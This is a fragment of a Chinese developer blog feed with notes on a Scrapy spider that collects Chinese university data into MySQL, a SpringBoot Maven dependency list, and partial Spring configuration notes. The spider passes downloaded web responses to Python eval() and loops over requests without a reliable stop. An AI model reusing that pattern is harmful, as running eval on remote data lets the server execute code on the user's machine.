class="hljs-string">&#x27;code&#x27;</span>],item[<span class="hljs-string">&#x27;cateCode&#x27;</span>],item[<span class="hljs-string">&#x27;category&#x27;</span>],item[<span class="hljs-string">&#x27;subject&#x27;</span>],item[<span class="hljs-string">&#x27;subCode&#x27;</span>])<br><br>            sql = <span class="hljs-string">&quot;INSERT INTO `ceedb`.`codespecialty`(`name`,`code`,`cateCode`,`category`,`subject`,`subCode`)VALUES(%s,%s,%s,%s,%s,%s);&quot;</span><br>            <span class="hljs-keyword">try</span>:<br>                self.cursor.execute(sql, values)<br>                self.con.commit()<br><br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;insert failed&quot;</span>)<br>                <span class="hljs-built_in">print</span>(item)<br><br>            <span class="hljs-keyword">return</span> item<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close_spider</span>(<span class="hljs-params">self,spider</span>):<br>        self.cursor.close()<br>        self.con.close()<br></code></pre></td></tr></table></figure><p>open_spider开启爬虫时运行的代码</p><p>close_spider关闭爬虫时运行的代码</p><p>process_item用来接收上层传递来的数据如果接收到None就直接跳过</p><h1 id="items"><a href="#items" class="headerlink" title="items"></a>items</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Define here the models for your scraped items</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># See documentation in:</span><br><span class="hljs-comment"># https://docs.scrapy.org/en/latest/topics/items.html</span><br><br><span class="hljs-keyword">import</span> scrapy<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SpiderdataItem</span>(scrapy.Item):<br>    <span class="hljs-comment"># define the fields for your item here like:</span><br>    <span class="hljs-comment"># name = scrapy.Field()</span><br><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CodeSpecialty</span>(scrapy.Item):<br>    cateCode = scrapy.Field()<br>    category = scrapy.Field()<br>    name = scrapy.Field()<br>    subject = scrapy.Field()<br>    subCode = scrapy.Field()<br>    code = scrapy.Field()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolInfo</span>(scrapy.Item):<br><br>    schoolName = scrapy.Field()<br>    schoolBelong = scrapy.Field()<br>    levelName = scrapy.Field()<br>    typeName = scrapy.Field()<br>    dualClassName = scrapy.Field()<br>    address = scrapy.Field()<br>    content = scrapy.Field()<br>    isSeal = scrapy.Field()<br>    numSubject = scrapy.Field()<br>    numMaster = scrapy.Field()<br>    numDoctor = scrapy.Field()<br></code></pre></td></tr></table></figure><p>用来存储爬取下来数据整理到一个对象种,用于scrapy中传递数据</p><h1 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> scrapy<br><span class="hljs-keyword">from</span> ..items <span class="hljs-keyword">import</span> SchoolInfo<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">SchoolInfoSpider</span>(scrapy.Spider):<br>    name = <span class="hljs-string">&#x27;school_info&#x27;</span><br>    allowed_domains = [<span class="hljs-string">&#x27;static-data.eol.cn&#x27;</span>]<br>    start_urls = [<span class="hljs-string">&#x27;https://static-data.eol.cn/www/2.0/school/30/info.json&#x27;</span>]<br>    sign = <span class="hljs-literal">True</span><br><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse</span>(<span class="hljs-params">self, response</span>):<br>        number = <span class="hljs-number">31</span><br>        <span class="hljs-keyword">while</span> self.sign:<br>            url = <span class="hljs-string">&quot;https://static-data.eol.cn/www/2.0/school/&quot;</span>+<span class="hljs-built_in">str</span>(number)+<span class="hljs-string">&quot;/info.json&quot;</span><br>            number += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">yield</span> scrapy.Request(url=url, callback=self.parse_url)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_url</span>(<span class="hljs-params">self,response</span>):<br>        SI = SchoolInfo()<br>        result = response.text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        jsonDict = <span class="hljs-built_in">eval</span>(result)<br>        <span class="hljs-keyword">if</span> jsonDict != <span class="hljs-string">&quot;&quot;</span>:<br>            dataDict = jsonDict[<span class="hljs-string">&#x27;data&#x27;</span>]<br>            <span class="hljs-comment">################################</span><br>            schoolName = dataDict[<span class="hljs-string">&#x27;name&#x27;</span>]<br>            schoolBelong = dataDict[<span class="hljs-string">&#x27;belong&#x27;</span>]<br>            levelName = dataDict[<span class="hljs-string">&#x27;level_name&#x27;</span>]<br>            typeName = dataDict[<span class="hljs-string">&#x27;type_name&#x27;</span>]<br>            dualClassName = dataDict[<span class="hljs-string">&#x27;dual_class_name&#x27;</span>]<br>            address = dataDict[<span class="hljs-string">&#x27;address&#x27;</span>]<br>            content = dataDict[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            isSeal = dataDict[<span class="hljs-string">&#x27;is_seal&#x27;</span>]<br>            numSubject = dataDict[<span class="hljs-string">&#x27;num_subject&#x27;</span>]<br>            numMaster = dataDict[<span class="hljs-string">&#x27;num_master&#x27;</span>]<br>            numDoctor = dataDict[<span class="hljs-string">&#x27;num_doctor&#x27;</span>]<br><br>            SI[<span class="hljs-string">&#x27;schoolName&#x27;</span>] = schoolName<br>            SI[<span class="hljs-string">&#x27;schoolBelong&#x27;</span>] = schoolBelong<br>            SI[<span class="hljs-string">&#x27;levelName&#x27;</span>] = levelName<br>            SI[<span class="hljs-string">&#x27;typeName&#x27;</span>] = typeName<br>            SI[<span class="hljs-string">&#x27;dualClassName&#x27;</span>] = dualClassName<br>            SI[<span class="hljs-string">&#x27;address&#x27;</span>] = address<br>            SI[<span class="hljs-string">&#x27;content&#x27;</span>] = content<br>            SI[<span class="hljs-string">&#x27;isSeal&#x27;</span>] = isSeal<br>            SI[<span class="hljs-string">&#x27;numSubject&#x27;</span>] = numSubject<br>            SI[<span class="hljs-string">&#x27;numMaster&#x27;</span>] = numMaster<br>            SI[<span class="hljs-string">&#x27;numDoctor&#x27;</span>] = numDoctor<br><br>            <span class="hljs-built_in">print</span>(SI)<br><br>            <span class="hljs-keyword">yield</span> SI<br>        <span class="hljs-keyword">else</span>:<br>            self.sign=<span class="hljs-literal">False</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br></code></pre></td></tr></table></figure><p>name用来表明爬虫名称</p><p>allowed_domains允许的爬取范围</p><p>start_urls第一个爬取的地址</p><p>从start_urls爬取的数据会返回到parse中在parse中可以返回scrapy.Item类型或者一个请求、</p>]]></content>
    
    
    <categories>
      
      <category>爬虫随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringBoot-maven合集</title>
    <link href="/2022/01/10/SpringBoot-maven%E5%90%88%E9%9B%86/"/>
    <url>/2022/01/10/SpringBoot-maven%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="整理Maven依赖"><a href="#整理Maven依赖" class="headerlink" title="整理Maven依赖"></a>整理Maven依赖</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs xml">        <span class="hljs-comment">&lt;!--swagger3.0接口--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--        swagger3.0的ui依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.springfox<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>springfox-swagger-ui<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        druid--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        jdbc--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        log4j--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        mysql连接依赖--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-comment">&lt;!--        &lt;dependency&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--            &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;--&gt;</span><br><span class="hljs-comment">&lt;!--        &lt;/dependency&gt;--&gt;</span><br><br><span class="hljs-comment">&lt;!--        springboot web--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        spring-mybatis--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        热启动,随着文件修改会自动重新编译--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-devtools<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--        lombok--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">optional</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">optional</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.security<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-security-test<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.httpcomponents<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>httpclient<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--关联email--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-mail<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--knife4j文档接口是一种集成了swagger的文档接口--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.xiaoymin<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>knife4j-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.0.7<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--mybatis-plus 真不戳 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--JAVA工具类 真不戳--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.hutool<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hutool-all<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.7.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-comment">&lt;!--kaptcha依赖--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.penggle<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Spring开发随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Maven</tag>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Spring随笔-不完整</title>
    <link href="/2022/01/10/Spring%E9%9A%8F%E7%AC%94-%E4%B8%8D%E5%AE%8C%E6%95%B4/"/>
    <url>/2022/01/10/Spring%E9%9A%8F%E7%AC%94-%E4%B8%8D%E5%AE%8C%E6%95%B4/</url>
    
    <content type="html"><![CDATA[<p>Q@PropertySource</p><p>​修改加载资源路径</p><p>@ConfigurationProperties(prefix&#x3D;”在全局中用什么名字来代表”)</p><p>​告诉SpringBoot将本类中的所有属性和配置文件进行绑定</p><p>@EnableAutoConfiguration:</p><p>​利用EnableAutoConfigurationSelector给容器中导入一些组件</p><p>​List<String>configurations &#x3D; getCandidateConfiguration();获取候选的配置</String></p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">SpringFactoriesLoader</span>.</span></span>load<span class="hljs-constructor">FactoryNames()</span><br>扫描所有jar包下的META-INF/spring.factories<br>把扫描到的文件的内容包装成properties对象<br>从properties中获取<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">EnableAutoConfiguration</span>.</span></span><span class="hljs-keyword">class</span>类对应的值然后把他们添加到容器中<br></code></pre></td></tr></table></figure><p>将类路径下的META-INF&#x2F;spring.factories里面的配置加入到EnableAutoConfiguration容器中</p><p>@Component</p><p>​添加到容器中（只有添加到容器中才能和@ConfigurationProperties一起使用）</p><p>@ImportResource(locations &#x3D; {“classpath:文件名”})</p><p>​导入Spring的配置文件，让配置文件里面的内容生效，自己写的spring配置文件系统不识别，需要用这个导入才行</p><p>@Conditional根据不同的条件进行判断(如果@Conditional~~~也是判断的效果)</p><p>@Configuration指明一个类是配置类</p><p>@Bean将方法的返回值添加到容器中容器组件的id默认是方法名</p><h1 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h1><p>​配置文件中可以使用${random.value}、${random.int[(一个值)|[一个范围如123，456]]}、${random.long}</p><p>​属性占位符</p><p>​app.name &#x3D; a</p><p>​app.nname &#x3D; ${app.name}</p><h1 id="Profile"><a href="#Profile" class="headerlink" title="Profile"></a>Profile</h1><h3 id="多Profile文件"><a href="#多Profile文件" class="headerlink" title="多Profile文件"></a>多Profile文件</h3><p>​主配置文件可以写成application-{Profile这里泛指文件环境名}.properties</p><p>​默认使用application.properties的配置</p><h3 id="激活Profile文件"><a href="#激活Profile文件" class="headerlink" title="激活Profile文件"></a>激活Profile文件</h3><p>​1.在application.properties中添加spring.profile.active &#x3D; “Profile上面那个环境名”</p><p>​2.用命令行配置–spring.profiles.active&#x3D;环境</p><p>​3.虚拟机配置-Dspring.profiles.active &#x3D; 环境</p><h3 id="yml多文档块"><a href="#yml多文档块" class="headerlink" title="yml多文档块"></a>yml多文档块</h3><p>​在一个文件中用</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><p>​来分割文档块</p><p>​</p><p>​profiles是指定不同的环境</p><p>​active:环境.</p><p>​可以开启不同的环境</p><h1 id="配置文件的加载位置"><a href="#配置文件的加载位置" class="headerlink" title="配置文件的加载位置"></a>配置文件的加载位置</h1>  <figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gradle">-<span class="hljs-keyword">file</span>:./config<br>-<span class="hljs-keyword">file</span>:./<br>-<span class="hljs-keyword">classpath</span>:<span class="hljs-regexp">/config/</span><br>-<span class="hljs-keyword">classpath</span>:/<br>加载顺序按照这个来依次加载<br>spring.config.location改变默认的配置文件位置<br>在项目打包好的情况下使用命令行启动的时候添加文件位置会和原来默认位置的配置文件进行互补配置<br></code></pre></td></tr></table></figure>  <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 